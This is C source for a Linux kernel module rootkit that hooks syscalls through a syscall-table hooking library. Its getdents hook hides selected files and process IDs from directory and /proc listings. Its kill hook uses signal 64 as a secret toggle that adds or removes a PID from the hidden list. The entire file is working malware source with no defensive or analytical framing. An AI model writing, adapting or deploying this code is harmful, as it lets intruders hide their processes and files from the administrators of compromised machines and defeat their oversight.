#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/path.h>
#include <asm/errno.h>

#include "include/hooklib.h"
#include "include/fdlib.h"


void* hook_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  struct linux_dirent *ldir = dirp;
  struct linux_dirent *next = NULL;
  struct linux_dirent *fuck;
  int totalsize = (sys_original(__NR_getdents))(fd, dirp, count);
  struct inode *pid_inode;
  int cnt = 0; 
  pid_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
  
  while(cnt < totalsize){
      printk("|%s| ", ldir->d_name);
      if( is_hidden_file(ldir->d_name) || (pid_inode->i_ino == PROC_ROOT_INO && is_hidden_pid(simple_strtoul(ldir->d_name, NULL, 10) ) ) ){
           next = (struct linux_dirent *) ((char *) ldir + ldir->d_reclen);
           totalsize -= ldir->d_reclen;
           memmove(ldir, next, totalsize-cnt);
      }
      cnt += ldir->d_reclen;
      ldir = (struct linux_dirent *) ((char *) ldir + ldir->d_reclen);
  }
  return (int)totalsize;
}

void* hook_sys_kill(pid_t pid, int sig){
    if(sig == 64){
      if(is_hidden_pid(pid)){
         remove_hidden_pid(pid);
      } 
      else{
         add_hidden_pid(pid);
      }
      return -ENOMEM;
   }
   return (sys_original(__NR_kill))(pid, sig);
}


static int __init rtk_start(void)
{
  printk(KERN_INFO "Rootkit Enable!\n");
  if(sys_call_table == NULL){
      printk(KERN_ALERT "SYSCALL TABLE NOT FOUND");
      return -1;
   }
   printk(KERN_INFO "Syscall Table: %p\n", sys_call_table); 

   init_pid_list();
   init_list();
   create_sys_hook(__NR_getdents, hook_sys_getdents);
   create_sys_hook(__NR_kill, hook_sys_kill);
  return 0;
}
static void __exit rtk_stop(void)
{
  printk(KERN_INFO "Rootkit Disable\n");
  
  remove_all_sys_hook();  
}

module_init(rtk_start);
module_exit(rtk_stop);


